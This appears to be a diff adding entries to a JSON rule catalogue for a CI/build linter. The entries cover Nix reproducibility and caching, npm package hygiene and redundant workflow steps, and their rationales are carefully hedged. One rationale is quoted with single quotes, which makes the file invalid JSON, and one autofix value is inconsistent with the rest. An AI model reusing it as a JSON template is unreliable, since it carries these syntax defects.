+        "rationale": "An added or changed input may require lock regeneration; mutable references can then resolve differently, while immutable references need not. --no-update-lock-file rejects required updates, whereas --no-write-lock-file alone does not freeze resolution. This rule compares only supported literal source forms and reports direct references to missing nodes. A consistent lock constrains sources, not all build behavior."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-nixconfig-cache-not-trusted",
+      "metadataSha256": "b392dad38cc7bdd43691d62256a13ceebe4643fe6cb58f7309aea545af5d624f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake names an additional binary cache without recognized configuration at a CI command building it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Flake-provided substituters need appropriate acceptance and trust, or equivalent configuration outside the flake. This rule compares visible preceding installer/actions, per-command configuration and local flake targets on recognized hosted runners. External trust decisions, daemon policy and other cache sources may still provide reuse. A complete inventory is required, but it does not reveal runtime state or prove cache misses. Prefer explicitly reviewed cache URLs/keys to broadly accepting pull-request-controlled flake settings."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/flake-update-in-build-job",
+      "metadataSha256": "42836c6bd07285d507e006db18262e22061d277d1a22d9d368a4e8e36ba3e051",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A push/pull_request CI job runs `nix flake update` (or `--update-input`/`--recreate-lock-file`) before building."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Updating a lock in ordinary push/PR CI can resolve mutable inputs differently from the committed lock. Pinned or unchanged inputs need not change, other steps may preserve the result, and neither a lock nor this detector proves reproducible builds. Separating reviewed dependency updates from frozen-lock build checks makes the tested source set clearer. Explicit local-input refreshes and recognized publication paths can be intentional."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/get-env-builtin",
+      "metadataSha256": "694f611bf19f74d4dfcc732669199d44e8285c4e6967523ddd44643b18017fd4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not read environment variables with `builtins.getEnv` during evaluation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A demanded `builtins.getEnv` call can make evaluation depend on the calling process's environment. Under pure or restricted evaluation it returns an empty string. This can change derived results, but an unused lazy reference need not be called or affect a derivation. Values embedded in derivation attributes can be serialized into `.drv` files in the normally world-readable Nix store; merely using a value in a condition does not imply the original value is stored. Pass non-secret configuration explicitly and keep secrets outside derivations."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/git-input-for-github",
+      "metadataSha256": "81c65f0d0ffe7e687a8cc49aed5d40ef6579fd6d9d089776883b0c40de98e3cf",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input fetches a github.com repository with `git+https://` or `git+ssh://` instead of the `github:` tarball fetcher."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A `git+\u2026` flake reference uses Git, while `github:` downloads a commit tarball. The Nix manual describes the tarball fetcher as often faster and smaller; shallow Git fetches and warm caches reduce that difference. Fetcher changes can affect authentication, source metadata such as revCount and lockfile contents, so review and re-lock them rather than treating them as behavior-preserving edits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/imperative-install",
+      "metadataSha256": "4aa0ee8706bc6dc037ca1ea58df9f596aae41f4fc8a60f5425b71e97b576d5e6",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`nix-env -i` / `nix profile install` installs CI tools from a channel, branch or registry entry that moves."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`nix-env -i` without `-f` evaluates `~/.nix-defexpr`, i.e. the user's channels, whose nixpkgs revision is whatever the image or the last `nix-channel --update` fetched; `-f channel:\u2026` or a branch tarball fetches the branch head again whenever the cached tarball expires. `nix profile install nixpkgs#pkg` resolves the indirect `nixpkgs` reference through the flake registry (the global registry maps it to `github:NixOS/nixpkgs/nixpkgs-unstable`), and `github:owner/repo` without a commit follows that repository's default branch. None of these record the revision in the repository, so the tool version \u2014 and its dependency closure \u2014 changes with upstream pushes rather than with the commit under test, and an old commit cannot be re-run with the tools it was tested with. The install also mutates a user profile, which outlives the job on self-hosted runners. Taking nixpkgs from the repository's `flake.lock` (`--inputs-from .`), a commit tarball, or a `devShells` entry used through `nix develop` keeps the tools pinned and reviewable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/import-from-derivation",
+      "metadataSha256": "a8dfb4ca5f906b3384f9487bca87d90e6daaac876e8dd49572544bf279db448e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not import or read files produced by a derivation during evaluation (import from derivation)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "IFD demands derivation output during evaluation. If unavailable, it may need realization before evaluation continues, and evaluators disabling IFD reject demanded uses. Existing store outputs or substitutes can avoid rebuilding. This lexical detector recognizes conventional producers/readers and selected helpers; it cannot resolve arbitrary bindings, laziness or runtime cost. IFD is not itself proof of impurity. Committing generated code or moving generation to build time can remove an evaluation dependency, but needs regeneration policy and behavioral testing."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/impure-flag-in-ci",
+      "metadataSha256": "32a22f09c7ec11ffef49f81cbfdb844c2c726c358b7d011b538e095d0d12d2da",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`--impure` (or `--no-pure-eval`) on a Nix command in CI lets evaluation depend on unrecorded runner state."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": 'Flake commands evaluate in pure mode: the result is a function of the flake source and the revisions pinned in flake.lock, which is what makes a CI result reproducible and lets a binary cache serve the same outputs everywhere. `--impure` ("Allow access to mutable paths and repositories"), `--no-pure-eval` and `--option pure-eval false` switch that off, so the expression may read environment variables through `builtins.getEnv` (the usual reason is `NIXPKGS_ALLOW_UNFREE=1`), resolve `<nixpkgs>` from whatever `NIX_PATH` the runner has, use `builtins.currentSystem`/`builtins.currentTime`, read files outside the flake by absolute path, and fetch URLs without a hash. None of that is recorded in flake.lock, so the same commit can evaluate to different derivations on another runner or a later rerun, and the impurity silently spreads to every output that depends on it. Each of these needs has a pure equivalent: nixpkgs `config` in the flake, systems enumerated in `outputs`, inputs declared and locked.'
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/indirect-input",
+      "metadataSha256": "63f9fcc7f57c4f1bf888d48fceef1e52605f3a587ec8af78f326a44f37e1711a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake input is an indirect reference (`nixpkgs`, `flake:nixpkgs`, or no `url` at all) that Nix resolves through the mutable flake registries."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "An indirect flake reference names a registry entry instead of a source. Nix resolves it through the flake registries: the global registry (downloaded from the `flake-registry` setting and refreshed when older than `tarball-ttl`), then `/etc/nix/registry.json` (NixOS `nix.registry`), then `~/.config/nix/registry.json`, then `--override-flake`, the later taking precedence. flake.lock records what it resolved to once, but every `nix flake update` or re-lock resolves it again on whichever machine runs it, so a developer's `nix registry pin`, a NixOS `nix.registry` entry or a change to the global registry silently changes the source CI builds. An input with no `url`/`type`, or an `outputs` argument that is not declared under `inputs`, is the same indirect reference."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/installer-unpinned-nix-version",
+      "metadataSha256": "2755a78a5a6ad8b7be7a73968ae49e6b3e35638a1a34c5885243c97c0217c4a8",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A pinned nix-installer-action still installs whatever Nix version is newest at run time."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "DeterminateSystems/nix-installer-action downloads the most recent Determinate Nix Installer on every run, even when the action itself is pinned to a tag or commit, so the Nix version (evaluator, store schema, default settings, built-in fetchers) changes underneath a workflow whose author pinned the action for reproducibility. A Nix upgrade can change evaluation results, error on deprecated syntax, or alter `flake.lock` handling without any change in the repository. determinate-nix-action is tagged for every Determinate Nix release, so `@vX.Y.Z` installs exactly that release and Dependabot can propose upgrades as reviewable pull requests; alternatively `source-tag` pins the installer binary used by nix-installer-action."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/max-jobs-pinned-low",
+      "metadataSha256": "9a6cdf932f78f7182b91c8c1ff46805b79ad447ea394bb7e3b3edf5be67c4460",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix's `max-jobs` is pinned to a very small number on a GitHub-hosted runner."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "max-jobs limits concurrent local derivation builds; cores separately controls the parallelism a builder may use. A low explicit limit may leave capacity unused when independent uncached derivations are single-threaded. It can also be necessary to avoid memory exhaustion or oversubscription. This detector follows observed configuration precedence at build commands, but does not measure resource use, dependency parallelism or remote-daemon policy. Tune only after measuring representative builds."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/missing-flake-lock",
+      "metadataSha256": "ed193068ff9c6a19b1007a0ad47c5bd28a3d17ab05db7fbfed9720450e1f0c4d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A flake.nix with inputs has no flake.lock committed next to it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "flake.lock records resolved input identities. Without it, mutable references can resolve differently between runs, unless an external lock policy or explicit immutable inputs constrain them. Local or already revision-pinned inputs do not necessarily move. Committing and reviewing the lock improves source traceability; it does not prove deterministic outputs or cache hits. This absence check requires a complete repository inventory."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nix-build-inside-docker",
+      "metadataSha256": "48e3adbbf3f331446926712b59c6d0cda4237a8d7bba0fbe19839fb695dffd0b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review Nix sandboxing and store-cache reuse when Dockerfile RUN instructions build with a nixos/nix-named base."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Docker's isolation boundary is not the Nix build sandbox. Some nixos/nix releases disable Nix sandboxing for container compatibility, but a name, mirror or tag does not establish the running configuration or namespace capabilities. A missed BuildKit layer can repeat Nix work, while parent layers, cache mounts and substituters may still provide reuse. Moving image construction outside Docker changes build/runtime assumptions and must be validated; it does not automatically enable sandboxing or guarantee one layer per store path."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nix-shell-dash-p-unpinned",
+      "metadataSha256": "163cfc3f2787c3fd350858607e5c761977c53a65ebddab2a3ab60868a859a479",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Ad-hoc `nix-shell -p` / `nix run nixpkgs#\u2026` / `nix shell nixpkgs#\u2026` tools come from a moving nixpkgs branch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`nix-shell -p pkg` evaluates `with import <nixpkgs> {}; \u2026`, so the packages come from whatever the `nixpkgs` entry of the search path (`-I`, then `NIX_PATH`, then the `nix-path` setting) points at; a `channel:nixos-unstable` or `\u2026/archive/nixos-unstable.tar.gz` entry is downloaded afresh once the tarball cache expires and follows the branch. Likewise `nix run nixpkgs#pkg` and `nix shell nixpkgs#pkg` resolve the indirect `nixpkgs` reference through the flake registry, whose global entry is `github:NixOS/nixpkgs/nixpkgs-unstable`, and nothing records the revision used. Either way the tool version (and every dependency of it) changes with upstream pushes rather than with the commit under test, so a rerun of an old commit can build or lint differently and cache hits are lost whenever the branch moves. Pinning nixpkgs to a commit, or resolving `nixpkgs` from the repository's own `flake.lock` with `--inputs-from .`, makes the tool part of the reviewed inputs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nixpkgs-angle-bracket-path",
+      "metadataSha256": "2d2be47ce4c5252662c0e0c509daa1bd6940b500aee3764a9bdca4b9cdb1b15d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Nix expressions should not use `<nixpkgs>`-style lookup paths, which resolve through the machine's NIX_PATH."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Lookup paths resolve through search-path configuration, including NIX_PATH, nix-path and -I flags. That configuration may be pinned externally or may follow a mutable channel; this file-level detector does not establish which. Explicit pinned inputs make the dependency easier to audit. Pure evaluation disables ordinary external search-path resolution. A source pin is not a proof of deterministic builds or cache hits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/nixpkgs-input-not-channel",
+      "metadataSha256": "802156a8ba153b4572a471a4cf0cbc70f61680fd9ce771f4fbc899e191a8d41a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A nixpkgs flake input tracks `master`, a `release-*` or `staging*` branch instead of a channel branch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Development branches can advance before channel release gates finish. Channel branches are gated by selected jobs, not every package, architecture, license configuration or overlay. A development-branch lock may already have substitutes, and a channel lock may still require local builds. Inspect the chosen revision's actual substitutes before switching source policy, then review and test the changed lock."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/no-binary-cache-configured",
+      "metadataSha256": "d9eec1235dedcce2c969f639fd514240caf1ae647d4fa27ee676a3511e5ebddb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A hosted job builds local Nix targets with no additional binary cache visible before the build."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A cache can avoid rebuilding outputs unavailable from the default substituter on fresh runners. A local target may simply reuse nixpkgs packages already in cache.nixos.org, and external machine configuration may provide another cache, so absence in the inspected repository is not proof of cache misses. Measure repeated uncached builds before adopting authenticated cache persistence; scope write credentials to trusted jobs and account for storage, transfer and exposure costs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/no-lock-update-automation",
+      "metadataSha256": "f1c8ea42a15129ca1d3c4c20b942c206992192eba624ed0237130c708ded6129",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A committed flake.lock has no Dependabot, Renovate or scheduled workflow keeping it up to date."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Committed locks require deliberate maintenance. Repository-visible Dependabot, Renovate or update workflows can make that maintenance reviewable, but external services and manual targeted updates may already provide it. A commit timestamp is not a vulnerability assessment or proof of neglect. Even a small update can change a large build closure; automation does not guarantee smaller cache misses. Review and test update pull requests before merging."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/outdated-magic-nix-cache",
+      "metadataSha256": "e757d9d5d7d6aaa427f0d1f75d62ffc04747b24f03824395c3c463d06e9cda94",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review Magic Nix Cache action refs that predate v11's restored support."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Upstream v11 explicitly restored support, removed the retirement warning and added GITHUB_CONTEXT to the downloaded daemon's environment. The action wrapper version alone does not determine the downloaded binary or prove an actual cache failure: source overrides, service configuration and GitHub Enterprise Server differ. Review runtime logs and supported versions before an upgrade or migration; neither is an unattended behavior-preserving fix."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/overlay-overrides-foundational-package",
+      "metadataSha256": "4e5f9956fd2ed735c38c138e0428d7e6d616589a7c7ae1a9717a0290a3426a1e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Overlays should not globally replace foundational packages such as `stdenv`, `glibc`, `openssl` or `zlib`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A package-set overlay can change inputs widely, especially foundational libraries and bootstrap packages. Rebinding alone does not establish changed derivations: metadata-only overrides or equivalent values can retain store paths, and changed outputs may already exist in a cache. Evaluate the before/after derivation graph and substitutability before deciding whether to narrow an intentional override. Scoped overrides also change dependency policy and require testing."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/quick-install-implicit-flake-config-trust",
+      "metadataSha256": "93f984bb4c082f564f445bf00b07da331c5d0e1f426418ce12cd058e8dc65e2a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "nixbuild/nix-quick-install-action silently enables `accept-flake-config`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The recognized nix-quick-install-action releases append accept-flake-config = true after nix_conf when installing Nix newer than 2.13 (including 2.13.6). Flake-evaluating commands can then accept eligible top-level nixConfig settings without confirmation. This is a single-user installer, not evidence that a root-owned daemon honors every option. A false setting inside nix_conf is overwritten by the appended line; an effective NIX_CONFIG or CLI setting can override it. Review trust deliberately and preserve existing configuration when changing it. Unknown releases, dynamic versions and opaque configuration writes are not treated as established trust."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/raw-store-cache",
+      "metadataSha256": "5decec53d06ae58165b67d4189c3df9ba004d34630888ac002676515e585cf7a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Do not cache `/nix/store` or `/nix/var/nix` with actions/cache; use a Nix-aware cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The Nix store is only consistent together with its SQLite database (`/nix/var/nix/db/db.sqlite`), which records which store paths are valid and their references. actions/cache archives and extracts plain files as the runner user: on a multi-user install `/nix/store` is root-owned and read-only, so extraction can fail with permission errors, and restoring the store without the database (or a stale database over the one the installer just created) leaves paths Nix does not consider valid or registrations for paths that are missing. Nothing is garbage-collected before saving, so every save carries the whole store towards the 10 GB repository cache limit. nix-community/cache-nix-action merges the restored and current databases and can collect garbage before saving; a binary cache (Cachix, Attic, FlakeHub Cache) substitutes individual paths through Nix itself."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/rust-two-phase-build",
+      "metadataSha256": "18834aecae4810a40a67fa2ccc2bc7dbd237997bd26c6ebed0ce3420bbeb9e73",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Rust crates built from local source should compile dependencies in a separate, cacheable derivation."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Standard buildRustPackage separates dependency source fetching from package compilation, not necessarily dependency compilation from workspace compilation. When included local source changes, the package derivation can change, and a cache miss may rebuild dependency crates. Two-phase builders such as crane can reuse compatible compiled artifacts, but their inputs also include toolchains, features, native dependencies and build scripts, not only Cargo.lock. Custom phases and compiler caches can already provide reuse. Measure representative builds and preserve all build behavior before migrating."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/sandbox-disabled",
+      "metadataSha256": "b6e2e22006e6b277ea2eea41f131a1a22065c40c2ee0b36a620a6e769b7fc489",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "The Nix build sandbox is turned off or relaxed in CI, in flake nixConfig, or by `__noChroot`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Nix sandboxing restricts access to undeclared host state. Disabling or relaxing it can make additional inputs available, but does not establish that a derivation uses them or produces different bytes. Input-addressed store paths identify declared inputs, not a proof of deterministic output. This rule follows observed configuration precedence at build commands and also reports explicit flake requests and recognizable derivation __noChroot attributes. Restricted daemon settings, remote builders, unsupported shell code and container namespace support cannot be established statically. macOS and container jobs are conservatively omitted rather than assuming Linux defaults apply. No isolation change is automatic."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/separate-nix-build-invocations",
+      "metadataSha256": "e5ab52a4fba51738215b03a5b070657446cfd66d54d9f0055906ef9894c1466e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consecutive `nix build` commands in one job that could be a single `nix build` of all installables."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Each `nix build` is a separate Nix process: it locks and evaluates the flake again (shared work such as importing nixpkgs is repeated, because the evaluation cache only records final attribute values), then realises that installable's closure before the shell moves on. The next invocation cannot start building until the previous closure is finished, so while the last few derivations of one installable build, cores that `max-jobs` would let Nix use for the next one stay idle. `nix build .#a .#b` evaluates both installables in one evaluator and hands the union of their closures to one scheduler, which builds independent derivations concurrently and shares common dependencies. Out links become `result`, `result-1`, ... in installable order."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "nix/src-whole-repo",
+      "metadataSha256": "80b495eb2732b6559b245e05899e7eed83932c652882c255c33d9beda119c403",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Derivations should not use the whole repository (`src = ./.`) as their source."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A broad source path can include files unrelated to the build. Changes to included files affect the source store path and can invalidate derivation reuse, although another cache may already contain the new result. Git-flake filtering and builder-specific filtering affect the actual file set. Selecting all necessary inputs with a fileset can reduce invalidation; omitting a required build script, fixture or generated input changes behavior. Measure and test rather than applying a guessed file list automatically."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/exports-map",
+      "metadataSha256": "392704693101f548c834ae8073c8b349720db905e0303b188f9c1af01264a9f5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Library packages should declare an `exports` map, and ESM libraries a `sideEffects` field."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "An `exports` map is the package's public API: it blocks deep imports into internals, so packages can be split, moved, and rebuilt independently without breaking consumers, and it lets bundlers and TypeScript resolve the right entry without probing. `sideEffects` tells bundlers which modules are safe to drop, which keeps tree-shaking effective and app bundles (and their build times) small."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/files-allowlist",
+      "metadataSha256": "0c1416338e68d26bf6381dae5f86ab93c530e2e17b43081fd7b0ad62484ff851",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Publishable packages should declare a `files` allowlist (or an `.npmignore`) so the tarball only ships build output."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without an allowlist `npm publish` packs the whole package directory: sources, tests, fixtures, configs, and stray build caches. Bloated tarballs make every install, CI cache restore, and container layer that contains node_modules larger and slower, and can leak files that were never meant to be published. A `files` allowlist keeps composable packages small."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/monolith",
+      "metadataSha256": "7332bc783994d6ef89830b825d56b2c1b289cead33d707818f40a44cde4aad7e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Packages with very many dependencies are candidates for decomposition into smaller composable packages."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A package that pulls in everything is one cache key: any change to it, or to any of its dependencies, reinstalls, rebuilds, and retests the whole thing, and every image that contains it ships all of it. Smaller packages with explicit boundaries let affected-only CI, remote caches, and OCI layers reuse work, which is what keeps agentic edit-test loops fast."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/version-drift",
+      "metadataSha256": "496692f7adfa8b1b9dda706833930514b6eb72b24aaa97b1bbbf21855b6a79d4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workspace packages should declare each third-party dependency with the same version specifier."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When packages in one monorepo ask for different ranges of the same dependency, the lockfile carries several copies, installs and node_modules grow, Docker dependency layers and CI caches fragment by package, and packages behave differently at runtime and in tests. A single version policy keeps one hermetic dependency set that every package and image layer can share."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/duplicate-command",
+      "metadataSha256": "e7ea779520225e2f2d031b8e28746c9e2753a0dd9eff66391449e497c4f307f5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated non-trivial shell commands for potentially redundant work."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated command text can indicate avoidable work, but identical text does not establish identical effects or cost: files, environment, tool caches and external state may have changed. Check conditions and intervening effects before removing an invocation, then measure any savings."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/duplicate-setup-step",
+      "metadataSha256": "db751fc4ee334569867f82f6a41d0f72da0e26d8450fac9fef5d9f836110bdc3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated toolchain setup declarations with matching visible inputs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated setup declarations may add avoidable work, but tool caches can avoid downloads and intervening steps can change the environment or toolchain. Matching visible inputs alone does not establish that the second setup is redundant. Verify conditions, outputs and environment requirements before removing it."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/rebuild-per-job",
+      "metadataSha256": "067374fbe410f03afba66ddb3fea6c646a627e7d6785d5ce269b10ce80a9f781",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Several jobs in a workflow should not each rebuild the same project from scratch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/repeated-job-setup",
+      "metadataSha256": "2259417589446a00fe065d21a5f1c95c2dc4acd857b1feccdda317f78c550c46",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs that repeat the same leading setup steps could share a composite action."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/shadowed-env",
+      "metadataSha256": "268e28d3d31ecc68960e2488a4d4cd13c70d0b3bccbfb07dad035f0f78911395",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job or step should not redefine an environment variable to the value it already inherits."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
